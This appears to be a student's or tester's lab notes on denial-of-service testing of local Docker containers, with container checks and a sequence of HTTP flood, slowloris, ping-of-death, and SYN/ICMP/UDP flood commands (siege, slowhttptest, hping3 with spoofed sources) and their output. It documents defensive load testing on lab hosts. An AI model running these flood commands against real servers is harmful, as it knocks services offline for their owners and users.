1.Additional resource
https://pentest.blog/how-to-perform-ddos-test-as-a-pentester/

1.1. Check docker container, do them work:

```
 curl -i 10.5.0.6
HTTP/1.1 404 Not Found
Server: nginx
Date: Wed, 29 Dec 2021 14:34:09 GMT
Content-Type: text/html
Content-Length: 146
Connection: keep-alive

<html>
<head><title>404 Not Found</title></head>
<body>
<center><h1>404 Not Found</h1></center>
<hr><center>nginx</center>
</body>
</html>


curl -i 10.5.0.5:8080
HTTP/1.1 404 Not Found
Content-Type: text/plain; charset=utf-8
X-Content-Type-Options: nosniff
Date: Wed, 29 Dec 2021 14:34:28 GMT
Content-Length: 19

404 page not found


 curl -i 10.5.0.5:8080/api/
HTTP/1.1 200 OK
Date: Wed, 29 Dec 2021 14:34:55 GMT
Content-Length: 32
Content-Type: text/plain; charset=utf-8

Hello, i'm a golang microservices
```
2. Go to nginx container and check it
```
docker exec -it nginx bash
root@fe1408ea1325:/# netstat

apt update
apt install net-tools

netstat
Active Internet connections (w/o servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 fe1408ea1325:46270      199.232.138.132:80      TIME_WAIT  
tcp        0      0 fe1408ea1325:46268      199.232.138.132:80      TIME_WAIT  
tcp        0      0 fe1408ea1325:54328      151.101.194.132:80      TIME_WAIT  
Active UNIX domain sockets (w/o servers)
Proto RefCnt Flags       Type       State         I-Node   Path
unix  3      [ ]         STREAM     CONNECTED     162718   
unix  3      [ ]         STREAM     CONNECTED     162717   
root@fe1408ea1325:/# netstat -tnulp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:42181        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1/nginx: master pro 
udp        0      0 127.0.0.11:45587        0.0.0.0:*                           -                   
root@fe1408ea1325:/# netstat -nap
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.11:42181        0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1/nginx: master pro 
tcp        0      0 10.5.0.6:80             10.5.0.1:57316          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58128          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:57710          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:57552          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:56072          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58022          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:56450          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:56974          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:57378          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:57042          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:57254          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58084          ESTABLISHED -            

udp        0      0 127.0.0.11:45587        0.0.0.0:*                           -                   
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   PID/Program name     Path
unix  3      [ ]         STREAM     CONNECTED     162718   1/nginx: master pro  
unix  3      [ ]         STREAM     CONNECTED     162717   1/nginx: master pro  
root@fe1408ea1325:/# netstat -nap | grep STABLE
root@fe1408ea1325:/# netstat -nap | grep STABLISHED
root@fe1408ea1325:/# netstat -nap | grep STABLISHED
tcp        0      0 10.5.0.6:80             10.5.0.1:59670          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58888          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59576          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58826          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59184          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59158          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59104          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58576          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59462          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59036          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58722          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59280          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58774          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59102          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59672          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58792          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58952          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58616          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:59562          ESTABLISHED -                   
tcp        0      0 10.5.0.6:80             10.5.0.1:58412          ESTABLISHED -          

netstat -nap | grep STABLISHED | wc -l
1000

```

3. HTTP flood
```siege -b -c250 -t60s http://localhost:8084
New configuration template added to /home/slava/.siege
Run siege -C to view the current settings in that file
** SIEGE 4.0.4
** Preparing 250 concurrent users for battle.
The server is now under siege...[error] socket: read error Connection reset by peer sock.c:539: Connection reset by peer
```

4. HTTP flood
```
 siege -b -c250 -t60s http://10.5.0.6
** SIEGE 4.0.4
** Preparing 250 concurrent users for battle.
The server is now under siege...
Lifting the server siege...
Transactions:                 849797 hits
Availability:                 100.00 %
Elapsed time:                  59.27 secs
Data transferred:             118.32 MB
Response time:                  0.02 secs
Transaction rate:           14337.73 trans/sec
Throughput:                     2.00 MB/sec
Concurrency:                  248.53
Successful transactions:           0
Failed transactions:               0
Longest transaction:            0.18
Shortest transaction:           0.00

```


5. HTTP flood
```
 siege -b -c250 -t60s http://10.5.0.6
** SIEGE 4.0.4
** Preparing 250 concurrent users for battle.
The server is now under siege...
Lifting the server siege...
Transactions:                 849797 hits
Availability:                 100.00 %
Elapsed time:                  59.27 secs
Data transferred:             118.32 MB
Response time:                  0.02 secs
Transaction rate:           14337.73 trans/sec
Throughput:                     2.00 MB/sec
Concurrency:                  248.53
Successful transactions:           0
Failed transactions:               0
Longest transaction:            0.18
Shortest transaction:           0.00

```


6. Slow lory attack
```
 slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.5.0.6 -x 24 -p 3
slowhttptest -c 1000 -H -g -o slowhttp -i 10 -r 200 -t GET -u http://10.5.0.6 -x 24 -p 3

```

7. HTTP flood
```
 siege -b -c250 -t60s http://10.5.0.6
** SIEGE 4.0.4
** Preparing 250 concurrent users for battle.
The server is now under siege...
Lifting the server siege...
Transactions:                 849797 hits
Availability:                 100.00 %
Elapsed time:                  59.27 secs
Data transferred:             118.32 MB
Response time:                  0.02 secs
Transaction rate:           14337.73 trans/sec
Throughput:                     2.00 MB/sec
Concurrency:                  248.53
Successful transactions:           0
Failed transactions:               0
Longest transaction:            0.18
Shortest transaction:           0.00

```

8. Ping of death
```
fping -b 65510 10.5.0.6
fping: data size 65510 not valid, must be lower than 65488
```

9. Syn flood
```sudo hping3 -S --flood -V -p 80 10.5.0.6
    using br-c8d1838c7e87, addr: 10.5.0.1, MTU: 1500
    HPING 10.5.0.6 (br-c8d1838c7e87 10.5.0.6): S set, 40 headers + 0 data bytes
    hping in flood mode, no replies will be shown
```

10. ICMP flood
    hping3 --flood --rand-source -1 -p 8084 10.5.0.6
    [open_sockraw] socket(): Operation not permitted
    [main] can't open raw socket

11. UDP flood
TODO: write udp server on Golang
`hping3 --flood --rand-source --udp -p 8080 nginx`